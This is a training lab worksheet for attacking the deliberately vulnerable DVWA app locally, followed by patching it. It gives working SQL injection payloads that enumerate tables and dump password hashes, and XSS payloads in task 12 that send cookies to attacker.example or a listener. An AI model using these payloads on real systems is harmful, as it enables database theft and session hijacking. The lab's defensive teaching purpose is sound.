01 Briefing

You will set up a deliberately vulnerable web application (DVWA — Damn Vulnerable Web Application), then systematically exploit two of the most critical web vulnerabilities: SQL injection and cross-site scripting (XSS). After breaking things, you switch to the defender's seat and patch the vulnerabilities. This lab teaches you that web security is not theoretical — it is the difference between a demo and a breach. You will learn how attackers think, how to recognise vulnerable code patterns, and how to write secure alternatives.

You are a junior security engineer at a small company. The dev team has built an internal web app for managing customer records. They say it "works fine" and want to go to live. Your manager asks you to do a quick security review before launch. You spin up a safe practice environment (DVWA), learn the attack patterns, then apply those lessons to review the dev team's actual code. You have explicit written authorisation to attack the DVWA instance because it is a deliberately vulnerable training application running on your own machine. The rules are absolute: attack only what you own, only in isolation.

02 Concept Primer

Read before starting — these ideas frame every task below.

SQL injection (SQLi)
occurs when user input is concatenated directly into a database query instead of being parameterised. The database cannot tell the difference between data and commands. An attacker crafts input that changes the meaning of the query.
Cross-site scripting (XSS)
occurs when user input is rendered on a page without proper encoding. An attacker injects JavaScript that runs in another user's browser — stealing sessions, defacing pages, or redirecting users.
The root cause is the same:
the application trusts user input. Every vulnerability in this lab traces back to a missing validation, sanitisation, or parameterisation step.
Prepared statements
(parameterised queries) are the fix for SQLi. **Output encoding** (HTML entity encoding) is the fix for XSS. Both are simple. Both are skipped constantly because they feel tedious.
DVWA security levels
correspond to increasing defences: Low (no protection), Medium (partial), High (strong but with bypasses), Impossible (properly secured). You attack at Low, then raise the level to see what the defence looks like.

03 Tasks — do these in order

Write down every command you run and its key output — your deliverable depends on the evidence, not on the answers. Click a command block to copy it.

1 · Explore the DVWA interface · Phase 1: Reconnaissance (15 min)
Familiarise yourself with the left-hand menu. Each item is a vulnerability category. Today you focus on SQL Injection and XSS (Reflected).
2 · Understand the source · Phase 1: Reconnaissance (15 min)
DVWA's source is in the container. Read it: These short files show you exactly why the app is vulnerable. Knowing the source makes the attack predictable — that is the point.
docker exec dvwa cat /var/www/html/vulnerabilities/sqli/source/low.php
   docker exec dvwa cat /var/www/html/vulnerabilities/xss_r/source/low.php
3 · Set up your proxy · Phase 1: Reconnaissance (15 min)
If you have Burp Suite or OWASP ZAP, configure your browser to proxy through it. If not, use your browser's developer tools (F12 → Network tab) to inspect requests and responses. You need to see the HTTP traffic to understand what the app is doing.
4 · Identify the injection point · Phase 2: SQL Injection (25 min)
Go to the SQL Injection page. It has a form: "User ID". Enter 1 and submit. Observe the result — the app returns the user's first and last name. This means the input reaches a SQL query.
5 · Confirm the vulnerability · Phase 2: SQL Injection (25 min)
Try a classic test: If the app returns multiple records (or all users), you have confirmed SQLi. The single quote broke out of the SQL string context, and the OR '1'='1' condition is always true.
' OR '1'='1
6 · Determine the number of columns · Phase 2: SQL Injection (25 min)
SQL UNION SELECT requires matching column counts. Use ORDER BY to probe: When you get an error, the previous number was the column count. DVWA Low is 2 columns — but verify it yourself.
1' ORDER BY 1--
   1' ORDER BY 2--
   1' ORDER BY 3--
7 · Extract the database name and version · Phase 2: SQL Injection (25 min)
With 2 columns: You now know which database you are talking to. Record both values.
1' UNION SELECT 1, database()--
   1' UNION SELECT 1, version()--
8 · Extract table names · Phase 2: SQL Injection (25 min)
Enumerate the information_schema: Find the users table. Then extract column names: `` 1' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users'-- ``
1' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=database()--
9 · Dump the users table · Phase 2: SQL Injection (25 min)
Extract the data: DVWA stores passwords as MD5 hashes. Crack them with hashcat or an online rainbow table. Document what you found.
1' UNION SELECT user_id, password FROM users--
10 · Identify the XSS point · Phase 3: Cross-Site Scripting (Reflected) (20 min)
Go to XSS (Reflected). It has a simple form: "What's your name?". Enter a name and submit. The page greets you by name. This input is rendered back into the HTML.
11 · Confirm reflected XSS · Phase 3: Cross-Site Scripting (Reflected) (20 min)
Enter a simple payload: If a JavaScript alert fires, the app is vulnerable. The script you submitted executed in the browser.
<script>alert('XSS')</script>
12 · Escalate the payload · Phase 3: Cross-Site Scripting (Reflected) (20 min)
A real attacker would not use alert — they would steal cookies: `` <script>document.location='http://attacker.example/?c='+document.cookie</script> ` Set up a listener to prove it works: Use a payload that requests your listener: ` <script>new Image().src='http://YOUR_VM_IP:9999/?c='+document.cookie</script> `` Check your listener's log. If you see the cookie data, you have demonstrated session theft.
python3 -m http.server 9999 &
13 · URL-encode the payload · Phase 3: Cross-Site Scripting (Reflected) (20 min)
Browsers and proxies filter certain characters. URL-encode your payload (spaces → %20, < → %3C, etc.) and put it directly in the URL. DVWA processes GET parameters — try the payload in the URL bar.
14 · Study the patched source · Phase 4: Defence — Fixing What You Broke (20 min)
DVWA includes secured versions: Compare them to the Low versions. Identify the specific code changes that eliminate the vulnerability.
docker exec dvwa cat /var/www/html/vulnerabilities/sqli/source/impossible.php
    docker exec dvwa cat /var/www/html/vulnerabilities/xss_r/source/impossible.php
15 · Switch DVWA to Medium security · Phase 4: Defence — Fixing What You Broke (20 min)
Use the dropdown. Attempt the same attacks. What changed? Why do they fail? Document the specific defence mechanism.
16 · Switch DVWA to High · Phase 4: Defence — Fixing What You Broke (20 min)
Try again. The High level uses mysqli_real_escape_string and output encoding. You may need a bypass — try it, but do not spend more than 10 minutes. The goal is to understand the defence, not to bypass it.
17 · Write a short secure code snippet · Phase 4: Defence — Fixing What You Broke (20 min)
In a file called secure_example.py or secure_example.php, write a minimal example of how you would safely handle the SQLi and XSS patterns you exploited. Use parameterised queries for SQL and HTML entity encoding for output.
18 · Complete the deliverables below · Phase 5: Reporting (10 min)
You will submit evidence of both the attacks and the fixes.

04 Deliverables

Everything lands in ~/cyber-labs/lab006/.

sqli-evidence.txt The exact payloads you used, the raw HTTP request (from Burp or browser dev tools), and the response that confirmed the vulnerability. Include the database name, version, table names, and cracked password hashes.
xss-evidence.txt The XSS payloads you used, the URL-encoded version, and proof of cookie theft (listener log or screenshot of the alert firing).
defence-notes.md For each vulnerability: what the Low source does wrong, what the Impossible source does right, and the specific code pattern that prevents the attack.
secure_code.py A minimal Python Flask (or raw PHP) example showing parameterised queries and output encoding.
lab-report.md The full report (template below).

05 Self-Check

Check yourself honestly — if the answer is no, fix your method before moving on.

Your `sqli-evidence.txt` contains at least 5 distinct SQLi payloads that produced different results (column count, database name, table names, column names, data dump).
Your `xss-evidence.txt` shows at least one payload that executed in the browser (alert fired or cookie sent to your listener).
Your `defence-notes.md` quotes specific lines from both Low and Impossible source code for both vulnerabilities.
Your `secure_code.py` uses `execute()` with parameter placeholders (not string formatting) and `html.escape()` (or equivalent) for output.
The report explains WHY each attack worked, not just that it worked.

06 Assessment

Answer in writing. Draft here, then copy into your report.

Q1Why does `' OR '1'='1` bypass the login form, but `' OR 1=1--` might not? What is the difference in how the comment characters change the query?
Q2You extracted data with `UNION SELECT`. What would happen if the original query returned 3 columns but your UNION only had 2? How would you fix it?
Q3DVWA High uses `mysqli_real_escape_string`. Why is this considered an "Impossible" level defence, yet still not best practice? What is the modern alternative?
Q4You stole a cookie with XSS. If the cookie had the `HttpOnly` flag, would your attack still work? What does `HttpOnly` protect against, and what does it NOT protect against?
Q5A developer says "we use a WAF (Web Application Firewall), so we don't need parameterised queries." What is your response? Give two specific reasons why this is insufficient.
